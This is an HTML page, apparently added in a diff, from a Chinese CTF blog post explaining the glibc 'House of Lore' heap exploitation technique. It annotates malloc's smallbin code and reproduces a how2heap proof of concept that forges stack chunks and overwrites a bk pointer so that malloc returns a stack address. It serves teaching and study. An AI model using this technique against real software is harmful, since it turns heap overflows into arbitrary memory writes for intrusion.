@@ -1,0 +1,856 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="heap,exploit," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="house of lore，我认为是house of *利用方式中利用条件比较难满足的吧，个人觉得实际很难遇到这种情况。所以就简单记录一下，不想浪费太多时间在这。还有house of mind和house of prime就以后碰到相关的题再记录了，因为平时好像几乎没怎么碰到过。 利用条件 Two chunks are allocated and the first one is overflow">
+<meta name="keywords" content="heap,exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of lore">
+<meta property="og:url" content="http://yoursite.com/2016/10/19/house-of-lore/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="house of lore，我认为是house of *利用方式中利用条件比较难满足的吧，个人觉得实际很难遇到这种情况。所以就简单记录一下，不想浪费太多时间在这。还有house of mind和house of prime就以后碰到相关的题再记录了，因为平时好像几乎没怎么碰到过。 利用条件 Two chunks are allocated and the first one is overflow">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/house-of-lore.PNG">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house of lore">
+<meta name="twitter:description" content="house of lore，我认为是house of *利用方式中利用条件比较难满足的吧，个人觉得实际很难遇到这种情况。所以就简单记录一下，不想浪费太多时间在这。还有house of mind和house of prime就以后碰到相关的题再记录了，因为平时好像几乎没怎么碰到过。 利用条件 Two chunks are allocated and the first one is overflow">
+<meta name="twitter:image" content="http://of38fq57s.bkt.clouddn.com/house-of-lore.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/19/house-of-lore/"/>
+
+
+  <title> house of lore | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                house of lore
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-10-19T04:41:22+08:00" content="2016-10-19">
+              2016-10-19
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/heap-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">heap_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/10/19/house-of-lore/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/10/19/house-of-lore/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>house of lore，我认为是house of *利用方式中利用条件比较难满足的吧，个人觉得实际很难遇到这种情况。所以就简单记录一下，不想浪费太多时间在这。还有house of mind和house of prime就以后碰到相关的题再记录了，因为平时好像几乎没怎么碰到过。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>Two chunks are allocated and the first one is overflowable。</li>
+<li>The second chunk is freed。</li>
+<li>Another (potentially more) chunk, bigger than the second one, is allocated。</li>
+<li>A new chunk with the same size of the second one is allocated。</li>
+<li>Another chunk with the same size of the second one is allocated。</li>
+</ol>
+<p>觉得这描述的很好，所以就无耻的照搬了~~~我用中文也是翻译一下，倒还不如用参考的英文描述。<br><a id="more"></a></p>
+<h2 id="利用详解"><a href="#利用详解" class="headerlink" title="利用详解"></a>利用详解</h2><p>先看一下漏洞代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void_t</span>*</div><div class="line">_int_malloc(mstate av, <span class="keyword">size_t</span> bytes)</div><div class="line">&#123;</div><div class="line">  [...]</div><div class="line"></div><div class="line">  checked_request2size(bytes, nb);</div><div class="line"></div><div class="line">  [...]</div><div class="line"></div><div class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)) &#123;</div><div class="line">    [...]</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  [...]</div><div class="line"></div><div class="line">  <span class="comment">/*</span></div><div class="line">    If a small request, check regular bin.  Since these "smallbins"</div><div class="line">    hold one size each, no searching within bins is necessary.</div><div class="line">    (For a large request, we need to wait until unsorted chunks are</div><div class="line">    processed to find best fit. But for small ones, fits are exact</div><div class="line">    anyway, so we can check now, which is faster.)</div><div class="line">  */</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</div><div class="line">    &#123;</div><div class="line">      idx = smallbin_index (nb);</div><div class="line">      bin = bin_at (av, idx);</div><div class="line"></div><div class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></div><div class="line">            malloc_consolidate (av);</div><div class="line">          <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">              bck = victim-&gt;bk;                <span class="comment">//!!!!!!!this is the point!!!!</span></div><div class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))    <span class="comment">//attention the check!!!!!  (1)</span></div><div class="line">                &#123;</div><div class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</div><div class="line">                  <span class="keyword">goto</span> errout;</div><div class="line">                &#125;</div><div class="line">              set_inuse_bit_at_offset (victim, nb);</div><div class="line">              bin-&gt;bk = bck;</div><div class="line">              bck-&gt;fd = bin;</div><div class="line"></div><div class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</div><div class="line">                victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">              check_malloced_chunk (av, victim, nb);</div><div class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</div><div class="line">              alloc_perturb (p, bytes);</div><div class="line">              <span class="keyword">return</span> p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>首先要执行这段代码malloc请求大小(经过转化，是internal size)要在smallbin范围内(largebin的对应代码已经修复，所以无法利用largebin了), 即在64到512字节间。<br>那么如果我们能控制victim-&gt;bk字段，将其改为栈上的地址(一般是栈上), 最后连续malloc两次，bk字段的指针将返回给用户(chunk2mem)。然后就能对相关内存进行任意写了(例如覆盖栈上返回地址)。</p>
+<p>要注意的是上面有个检测(1)，以前好像是没有的，所以还需要设置相应的字段，不能简单的覆盖bk字段就行了。</p>
+<h2 id="利用举例"><a href="#利用举例" class="headerlink" title="利用举例"></a>利用举例</h2><p>我还是拿另一份参考源代码来说明下。我觉得下面这个例子实在讲得很好，一看就懂，所以也就直接拿来用了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nWelcome to the House of Lore\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span>);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk\n"</span>);</div><div class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);     <span class="comment">/*first malloc*/</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</div><div class="line"></div><div class="line">  <span class="comment">// victim-8 because we need to remove the header size in order to have the absolute address of the chunk</span></div><div class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Create a fake chunk on the stack."</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></div><div class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</div><div class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></div><div class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></div><div class="line">         <span class="string">"chunk on stack"</span>);</div><div class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</div><div class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</div><div class="line">  </div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Allocating another chunk in order to avoid consolidating the top chunk with"</span></div><div class="line">         <span class="string">"the small one during the free()\n"</span>);</div><div class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);    <span class="comment">/*second malloc*/</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</div><div class="line"></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</div><div class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);       <span class="comment">/*free the first*/</span></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</div><div class="line"></div><div class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);  <span class="comment">/*third malloc*/</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</div><div class="line"></div><div class="line">  <span class="comment">//------------VULNERABILITY-----------</span></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</div><div class="line"></div><div class="line">  <span class="comment">/*actually, we need a chunk to overwrite the bk field, but for convenience, </span></div><div class="line">  we directly change the value of bk field*/</div><div class="line"></div><div class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></div><div class="line"></div><div class="line">  <span class="comment">//------------------------------------</span></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</div><div class="line"></div><div class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);   <span class="comment">/*forth malloc*/</span></div><div class="line"></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</div><div class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);  <span class="comment">/*fifth malloc*/</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"p4 = malloc(100)\n"</span>);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</div><div class="line">         stack_buffer_2[<span class="number">2</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我在上面标注了malloc的次数，其实最少得6次，上面只有5次，因为他直接改了bk字段的值, 没有overwrite。总体来说是下面的顺序：<br>1.malloc(n)—-&gt;2.malloc(n)—-&gt;3.malloc(n) —-&gt;4.free(2)—-&gt;5.malloc(n+m)—-&gt;6.overflow chunk2—-&gt;7.malloc(n)—-&gt;8.malloc(n)。步骤3是为了防止步骤2的chunk和top chunk合并。步骤5是为了让chunk 2 link到相应的samllbin中。</p>
+<p>上面代码中讲得非常清楚了。我只是将它记录一下，以备下次忘了能看看。那些malloc的请求大小只需要满足条件就行了，并不一定要像例子那样这么大。<br>另外需要注意的是free chunk时，该chunk首先link到unsorted bin中。然后下一次分配的大小如果比它大，那么将从top chunk上分配相应大小，而该chunk会被取下link到相应的bin中。如果比它小(相等则直接返回)，则从该chunk上切除相应大小，并返回相应chunk，剩下的成为last reminder chunk，还是存在unsorted bin中。</p>
+<p>执行效果如下：<br><img src="http://of38fq57s.bkt.clouddn.com/house-of-lore.PNG"></p>
+<h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p><a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" target="_blank" rel="external">X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS</a><br><a href="https://github.com/shellphish/how2heap/blob/master/house_of_lore.c" target="_blank" rel="external">how2heap/house_of_lore.c</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/heap/" rel="tag">#heap</a>
+          
+            <a href="/tags/exploit/" rel="tag">#exploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/18/house-of-spirit/" rel="next" title="house of spirit">
+                <i class="fa fa-chevron-left"></i> house of spirit
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/20/pwning-in-c++/" rel="prev" title="pwning in c++">
+                pwning in c++ <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用条件"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用详解"><span class="nav-number">2.</span> <span class="nav-text">利用详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用举例"><span class="nav-number">3.</span> <span class="nav-text">利用举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关参考"><span class="nav-number">4.</span> <span class="nav-text">相关参考</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2016/10/19/house-of-lore/';
+      var disqus_title = "house of lore";
+      var disqus_url = 'http://yoursite.com/2016/10/19/house-of-lore/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
